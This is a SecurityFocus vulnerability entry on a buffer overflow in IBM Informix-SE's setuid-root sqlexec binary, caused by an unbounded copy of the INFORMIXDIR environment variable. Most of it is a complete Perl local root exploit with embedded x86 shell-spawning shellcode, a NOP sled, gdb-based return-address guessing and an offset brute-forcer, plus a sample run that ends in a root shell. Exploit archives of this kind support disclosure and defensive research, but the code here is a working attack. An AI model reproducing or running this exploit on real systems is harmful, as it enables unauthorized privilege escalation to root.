source: http://www.securityfocus.com/bid/4891/info
 
Informix is an enterprise database distributed and maintained by IBM.
 
A buffer overflow vulnerability has been reported for Informix-SE for Linux. The overflow is due to an unbounded string copy of the INFORMIXDIR environment variable to a local buffer. There is at least one setuid root executable that is vulnerable, `sqlexec'. A malicious user may exploit the overflow condition in sqlexec to gain root privileges. 

#!/usr/bin/perl 
# IBM SE 7.25.UC1 for INTEL LINUX 2.4 GLIBC2.2.X
# Local Root Exploit by pHrail
# This exploits the sqlexec binary, and yields UID=0
# Tested on Mandrake Linux 8.2.  All other Linux presumed vulnerable
#
# IBM still hasn't patched this hole, and is available on their
# website http://www.informix.com/evaluate/
#
# shouts to Division7 and smurfy for help testing on this
# http://www.divisi0n7.org
#
# 
# [phrail@phrailnix phrail]$ ./ibm.pl -2000 
# *** Division 7 Security
# *** Now Exploiting sqlexec
# *** Offset: 0xfffff830
# *** Return: 0xbfffeb00
# *** Address: 0xbfffe330
# sh-2.05# id
# uid=0(root) gid=501(phrail) groups=501(phrail),43(usb)
# sh-2.05#
#
# (Note) May want to increase $buf 4 to 8 bytes depending on OS
use strict;

# $SIG{INT} = \&controlme;

my $argsnum = @ARGV;

if ($argsnum < 0 || $argsnum > 1) {
	&usage;
	exit;
}

# -2000 seemed to work on Mandrake 8.2

my $offset = $ARGV[0];
$offset = 0 unless $offset;

my $ret = 0xbfffeb00;

my $buf = 2024;

my $nop = "\x90";



# Our generic 48 byte shellcode.
my $shellcode = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" .
                 "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" .
                 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" .
                 "\x80\xe8\xdc\xff\xff\xff/bin/sh";


print "*** Now Overflowing INFORMIXDIR Variable\n";
 $ENV{'INFORMIXDIR'} = "A" x 2024; 
print "*** Now Calculating Your esp (Return Address Value)\n";
my $gotaddr = `gdb --command=gdbfile sqlexec | grep esp | cut -f2`;
print "*** Your Calculated Return Address Is $gotaddr\n";
print "*** Calculating Other Possible Addresses\n";

chop(my $get = $gotaddr);

my $minus = 4;
my @oop;
$oop[0] = $get - $minus;
$oop[1] = $get - $minus - $minus;
$oop[2] = $get - 0; 
$oop[3] = $get + $minus; 
$oop[4] = $get + $minus + $minus;

print("*** Gots 1 0x", sprintf('%lx',($oop[0])), "\n");
print("*** Gots 2 0x", sprintf('%lx',($oop[1])), "\n"); 
print("*** Gots 3 0x", sprintf('%lx',($oop[2])), "\n"); 
print("*** Gots 4 0x", sprintf('%lx',($oop[3])), "\n"); 
print("*** Gots 5 0x", sprintf('%lx',($oop[4])), "\n"); 
print("*** Gots 6 Default 0x", sprintf('%lx',($ret)), "\n"); 
print "*** Which esp do you want to use? (1 - 6) : ";
chomp(my $retv = <STDIN>);
my $retva;
if ($retv == 1) {
	$retva = $oop[0];
} elsif ($retv == 2) {
 	$retva = $oop[1];
} elsif ($retv == 3) {
	$retva = $oop[2];
} elsif ($retv == 4) {
	$retva = $oop[3];
} elsif ($retv == 5) {
	$retva = $oop[4];
} elsif ($retv == 6) {
	print "*** Using Default Return Address\n ";
	$retva = $ret;
} else {

	print "Invalid Option Lamer (1 - 6)\n";
	print "Goodbye\n";
	exit;
}






print "*** Do you want to brute? ( Y - N) : ";
chomp(my $brutea = <STDIN>);

if ($brutea =~/y/i) {
	&brute;
} else {
	&nbrute;
}

sub nbrute {
my $i;
my $buffer;
for ($i = 0; $i < ($buf - length($shellcode) - 100); $i++) {
	  $buffer .= $nop;
	   }
	     $buffer .= $shellcode;
	      
	     my $addr = pack('l', ($ret + $offset));
	      for ($i += length($shellcode); $i < $buf; $i += 4) {
		        $buffer .= $addr;
			 }

print "*** Division 7 Security\n"; 
print "*** Now Exploiting sqlexec\n";
print("*** Offset: 0x", sprintf('%lx',($offset)), "\n"); 
print("*** Return: 0x", sprintf('%lx',($retva)), "\n");  
print("*** Address: 0x", sprintf('%lx',($retva + $offset)), "\n");
 $ENV{'INFORMIXDIR'} = $buffer; exec("./home/phrail/SE/lib/sqlexec");

}

sub brute {
	my $i;
	my $buffer;
	my $p;
	print "Now Bruting Offsets -2000 - 2000\n";
	
	         for($p = -2000;$p < 2000;$p++) {
	for ($i = 0; $i < ($buf - length($shellcode) - 100); $i++) {
		  $buffer .= $nop;
		   }
		     $buffer .= $shellcode;
		      
		     my $addr = pack('l', ($ret + $p));
		      for ($i += length($shellcode); $i < $buf; $i += 4) {
			        $buffer .= $addr;
				 }

		
		         print(" *");
		
		
		 $ENV{'INFORMIXDIR'} = $buffer; system("./home/phrail/SE/lib/sqlexec");
    


			 
		 }	
	print "\nDone bruting...try another return address or increase the buffer.\n";
	print "Division 7 Security Systems\n";
	print "-pHrail\n";
	exit;
}

sub controlme {
	        $SIG{INT} = \&controlme;
	        print "Signal Caught Now Exiting\n";
	        print "Divison 7 Security Systems\n";
	   
	    
	      
	        
	        exit;
		`killall -9 $0`;
	}
sub usage {


print "*** IBM SE 7.25.UC1 for INTEL LINUX 2.4 GLIBC2.2.X\n";
print "*** Local Root Exploit by pHrail\n";
print "*** Division 7 Security Systems\n";
print "*** http://www.divisi0n7.org\n";
print "*** $0 <offset>\n";

}
